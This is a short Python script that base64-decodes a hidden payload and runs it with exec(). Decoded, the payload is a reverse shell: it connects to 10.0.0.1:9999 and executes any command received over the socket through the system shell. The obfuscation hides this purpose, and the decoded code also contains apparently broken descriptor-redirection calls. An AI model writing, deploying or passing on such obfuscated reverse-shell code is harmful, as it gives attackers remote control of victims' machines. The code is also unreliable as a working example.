import base64

def run_shellcode():
    try:
        shellcode = base64.b64decode(encoded_shellcode).decode()
        exec(shellcode)
    except Exception as e:
        print(f"[!] Shellcode execution failed: {e}")

encoded_shellcode = (
    "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCkNMSUVOVF9JUD0iMTAuMC4wLjEiCkNMSUVOVF9QT1JUPTk5OTkK"
    "cyA9IHNvY2tldC5zb2NrZXQoKQpzLmNvbm5lY3QoKENMSUVOVF9JUCwgQ0xJRU5UX1BPUlQpKQpzLmR1cChzLmZp"
    "bGVubygpLCAwKQpvcy5kdXAyKGZpbGVubj0wLGRzY3JmPTApCm9zLmR1cDIoZmlsZW5uPTAsZHN0aW49MCkKb3Mu"
    "ZHVwMChmaWxlbm49MCxkc291dD0wKQpzdWJwcm9jZXNzLmNhbGwocy5yZWN2KDEwMjQpLnN0cmlwKCksIHNoZWxs"
    "PVRydWUp"
)
